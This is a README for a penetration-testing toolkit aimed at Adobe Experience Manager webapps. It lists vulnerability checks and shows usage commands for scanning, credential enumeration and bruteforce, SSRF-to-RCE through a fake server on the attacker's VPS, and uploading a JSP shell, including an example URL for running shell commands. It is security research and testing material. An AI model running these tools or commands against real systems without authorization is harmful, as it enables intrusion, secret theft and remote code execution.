# AEM hacker toolset

Tools to identify vulnerable Adobe Experience Manager (AEM) webapps. AEM is an enterprise-grade CMS.

I built these tools to automate bughunting and pentesting of AEM webapps. I included checks for previously known vulnerabilities and misconfigurations, as well as for new ones, discovered by me in 2018. **All discovered vulnerabilities were responsibly reported to Adobe PSIRT**.
 
You can find more details about vulnerabilities and techniques in presentations, I've prepared for <a href="https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps">Hacktivity conference</a> and LevelUp 0x03.

AEM webapps are widespread and rarely configured securely or kept up to date. Bughunter, you have good chances to find security bugs, enjoy the tools!


Mikhail Egorov (<a href="https://twitter.com/0ang3el">@0ang3el</a>)

## Scripts

* `aem_hacker.py` - main script to scan AEM webapp for vulnerabilities.
* `aem_discoverer.py` - script to discover AEM webapps from list of URLs.
* `aem_enum.py` - script allows to automate enumeration of usernames and secrets through AEM's DefaultGetServlet.
* `aem_ssrf2rce.py`, `aem_server.py`, `response.bin` - scripts to get RCE from SSRF.
* `aem-rce-sling-script.sh` - script to get RCE by uploading JSP shell to /apps JCR node.

## aem_hacker.py
**Important:** You need a VPS to detect SSRF vulnerabilities!

Tool tries to bypass AEM dispatcher. 

Following checks are currently implemented:
* `Exposed DefaultGetServlet` - checks if JCR nodes, that might contain sensitive information and secrets, are exposed via DefaultGetServlet.
* `Exposed QueryBulderJsonServlet and QueryBuilderFeedServlet` - if those servlets are exposed it might be possible to access various sensitive information and secrets. 
* `Exposed GQLServlet` - GQLServlet is similar to QueryBuilderFeedServlet.
* `Ability to create new JCR nodes` - checks if it's possible to create new JCR node.
* `Exposed POSTServlet` - POSTServlet allows to create/modify/delete content in JCR. Depending on your access level, it's possible to get stored XSS or RCE. 
* `Exposed LoginStatusServlet` - LoginStatusServlet allows to bruteforce credentials.
* `Users with default password` - checks for admin:admin, author:author, etc.
* `Exposed Felix Console` - exposed Felix Console might lead to RCE by uploading backdoor OSGI bundle.
* `Enabled WCMDebugFilter` - vulnerable to CVE-2016-7882 WCMDebugFilter might lead to reflected XSS.
* `Exposed WCMSuggestionsServlet` - exposed WCMSuggestionsServlet might lead to reflected XSS.
* `Exposed AuditlogServlet` - checks if audit logs are exposed without authorization.
* `Exposed CRXDE logs` - checks if logs are exposed without authorization via CRXDE.
* `Exposed CRXDE and CRX` - checks for exposure of CRXDE and CRX.
* `SSRF SalesforceSecretServlet` - checks for SSRF via SalesforceSecretServlet (CVE-2018-5006). SSRF might allow to ex-filtrate secrets or perform XSS.
* `SSRF ReportingServicesServlet` - checks for SSRF via ReportingServicesServlet (CVE-2018-12809). SSRF might allow to ex-filtrate secrets or perform XSS.
* `SSRF SitecatalystServlet` - checks for SSRF via SitecatalystServlet. SSRF might allow to get RCE with the help of aem_ssrf2rce.py, when specific AEM version and appserver is used.
* `SSRF AutoprovisioningServlet` - checks for SSRF via AutoprovisioningServlet. SSRF might allow to get RCE with the help of aem_ssrf2rce.py, when specific AEM version and appserver is used.
* `SSRF Opensocial Proxy` - checks for SSRF via Opensocial (Shindig) proxy. SSRF might allow to ex-filtrate secrets or perform XSS.
* `SSRF Opensocial MakeRequest` - check for SSRF via Opensocial (Shindig) makeRequest. SSRF might allow to ex-filtrate secrets or perform XSS. You can use parameters `httpMethod`, `postData`, `headers`, `contentType` with `makeRequest`.
* `SWF XSSes` - checks for XSSes via SWF.
* `Deser ExternalJobServlet` - checks for vulnerable ExternalJobServlet.
* `Exposed Webdav` - checks for access to JCR via WebDav protocol. Exposed WebDav might lead to XXE (CVE-2015-1833) or stored XSS.
* `Exposed Groovy Console` - exposed Groovy console leads to RCE. 
* `Exposed ACS AEM Tools` - exposed ACS AEM Tools leads to RCE.

#### Help
```
python3 aem_hacker.py -h
usage: aem_hacker.py [-h] [-u URL] [--proxy PROXY] [--debug] [--host HOST]
                     [--port PORT] [--workers WORKERS]

AEM hacker by @0ang3el, see the slides -
https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps

optional arguments:
  -h, --help         show this help message and exit
  -u URL, --url URL  url to scan
  --proxy PROXY      http and https proxy
  --debug            debug output
  --host HOST        hostname or IP to use for back connections during SSRF
                     detection
  --port PORT        opens port for SSRF detection
  --workers WORKERS  number of parallel workers
```

#### Usage
```
python3 aem_hacker.py -u https://aem.webapp --host your_vps_hostname_ip
```

## aem_discoverer.py
Script allows to scan urls and find AEM webapps among them.

Tool tries to bypass AEM dispatcher.

#### Help
```
python3 aem_discoverer.py -h
usage: aem_discoverer.py [-h] [--file FILE] [--proxy PROXY] [--debug]
                         [--workers WORKERS]

AEM discoverer by @0ang3el, see the slides -
https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps

optional arguments:
  -h, --help         show this help message and exit
  --file FILE        file with urls
  --proxy PROXY      http and https proxy
  --debug            debug output
  --workers WORKERS  number of parallel workers
```

#### Usage
```
python3 aem_discoverer.py --file urls.txt --workers 150
```

## aem_enum.py
Script tries to grab usernames and secrets from JCR using AEM's DefaultGetServlet. Usernames are stored in properties of a node that ends with `By` (`jcr:createdBy`, `jcr:lastModifiedBy`, `cq:LastModifiedBy`, etc.).

Tool tries to bypass AEM dispatcher.

#### Help

```
python3 aem_enum.py -h
usage: aem_enum.py [-h] [--url URL] [--base BASE] [--grabdepth GRABDEPTH]
                   [--maxdepth MAXDEPTH] [--workers WORKERS] [--out OUT]
                   [--proxy PROXY] [--debug]

AEM exploration tool by @0ang3el (grabs users and secrets), see the slides -
https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps

optional arguments:
  -h, --help            show this help message and exit
  --url URL             AEM webapp URL, required parameter
  --base BASE           set base node (/etc or /apps or /home or /var), if not
                        set, base node is selected automatically
  --grabdepth GRABDEPTH
                        JCR subtree depth on each iteration, 2 should be a
                        safe value for all nodes
  --maxdepth MAXDEPTH   maximum depth for JCR search, increase it to find more
  --workers WORKERS     number of parallel workers
  --out OUT             CSV file with results, delimiter symbol is |
  --proxy PROXY         http and https proxy
  --debug               debug output
```

#### Usage

```
python3 aem_enum.py --url https://aem.webapp --out results.csv
```


## aem_ssrf2rce.py, aem_server.py, response.bin
Helps to exploit SSRF in `SitecatalystServlet` and `AutoprovisioningServlet` as RCE. It should work on AEM before AEM-6.2-SP1-CFP7 running on Jetty (default installation).

#### Help

```
python3 aem_ssrf2rce.py -h
usage: aem_ssrf2rce.py [-h] [--url URL] [--fakeaem FAKEAEM] [--proxy PROXY]

optional arguments:
  -h, --help         show this help message and exit
  --url URL          URL for SitecatalystServlet or AutoprovisioningServlet,
                     including path, without query part
  --fakeaem FAKEAEM  hostname/ip of fake AEM server
  --proxy PROXY      http and https proxy
```

#### Usage
Place `aem_server.py` and `response.bin` on your VPS. Run `aem_server.py` script.

```
python3 aem_server.py
starting fake AEM server...
running server...
```

Run `aem_ssrf2rce.py` script.

```
python3 aem_ssrf2rce.py --url https://aem.webapp/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet --fakeaem your_vps_hostname_ip
```

If RCE is possible, you should see incoming connection to your fake AEM server. After replication, you can access your shell from `https://aem.webapp/rcenode.html?Vgu9BKV9zdvJNByNh9NB=ls`.


## aem-rce-sling-script.sh
Script is handy when Felix Console is not available, but you have permissions to create new nodes under `/apps` JCR node.

#### Usage

```
./aem-rce-sling-script.sh https://aem.webapp username password
```